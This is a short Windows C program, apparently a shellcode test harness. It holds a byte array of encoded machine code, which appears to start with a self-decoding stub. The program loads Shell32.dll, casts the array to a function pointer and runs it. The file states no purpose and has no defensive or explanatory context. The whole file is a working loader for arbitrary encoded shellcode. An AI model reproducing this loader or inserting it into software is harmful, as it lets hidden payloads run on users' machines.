#include <windows.h>
char code[] =
"\xd9\xc6\xd9\x74\x24\xf4\xba\xfa\xd5\xb6\x69\x5e\x33\xc9\xb1"
"\x09\x31\x56\x17\x83\xc6\x04\x03\xac\xc6\x54\x9c\x38\x8a\xf5"
"\x3b\xb8\xc7\xda\xae\xb8\xbf\x8d\x5e\xdd\x51\xd9\x53\x77\xad"
"\xee\xab\xd7\xe1\x43\x7d\x87\xb9\x14\xa4\x61\xcc\x2b\x86";

int main(int argc, char **argv) 
{ 
  LoadLibraryA("Shell32.dll");	// Load shell32.dll library
  int (*func)(); 
  func = (int (*)()) code; 
  (int)(*func)(); 
}

